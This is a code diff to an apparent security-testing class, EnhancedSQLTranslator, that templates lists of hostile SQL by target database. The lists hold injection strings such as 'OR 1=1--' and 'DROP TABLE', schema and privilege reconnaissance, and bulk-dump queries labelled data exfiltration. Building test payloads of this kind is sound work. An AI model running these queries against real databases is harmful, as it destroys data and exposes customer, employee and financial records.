@@ -387,24 +387,38 @@ class EnhancedSQLTranslator:
         """Generate malicious SQL for security testing"""
         attack_type = intent.get('attack_chain', 'sql_injection')
         
+        target_database = intent.get('target_database', 'sales_db')
+        
+        # Determine appropriate table for the target database
+        table_map = {
+            'sales_db': 'customers',
+            'hr_db': 'employees',
+            'finance_db': 'invoices',
+            'marketing_db': 'leads',
+            'support_db': 'support_tickets',
+            'inventory_db': 'products',
+            'admin_db': 'user_sessions'
+        }
+        target_table = table_map.get(target_database, 'customers')
+        
         malicious_queries = {
             'sql_injection': [
-                "SELECT * FROM customers WHERE customer_id = 1 OR 1=1--",
-                "SELECT * FROM products; DROP TABLE products;--",
+                f"SELECT * FROM {target_table} WHERE id = 1 OR 1=1--",
+                f"SELECT * FROM {target_table}; DROP TABLE {target_table};--",
                 "SELECT user(), version(), database()",
                 "SELECT 1,2 UNION SELECT table_name, column_name FROM information_schema.columns--"
             ],
             'reconnaissance': [
                 "SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()",
-                "SELECT column_name FROM information_schema.columns WHERE table_name = 'customers'",
+                f"SELECT column_name FROM information_schema.columns WHERE table_name = '{target_table}'",
                 "SHOW GRANTS FOR CURRENT_USER()",
                 "SELECT @@version, @@hostname, USER()"
             ],
             'data_exfiltration': [
-                "SELECT * FROM customers LIMIT 10000",
-                "SELECT customer_id, company_name, contact_person, phone FROM customers",
-                "SELECT * FROM orders WHERE total_amount > 10000000",
-                "SELECT id, name, position FROM hr_db.employees"
+                f"SELECT * FROM {target_table} LIMIT 10000",
+                f"SELECT * FROM {target_table} WHERE id > 0",
+                f"SELECT * FROM {target_table} ORDER BY 1 LIMIT 1000",
+                f"SELECT * FROM {target_database}.{target_table}"
             ],
             'privilege_escalation': [
                 "SHOW GRANTS FOR CURRENT_USER()",
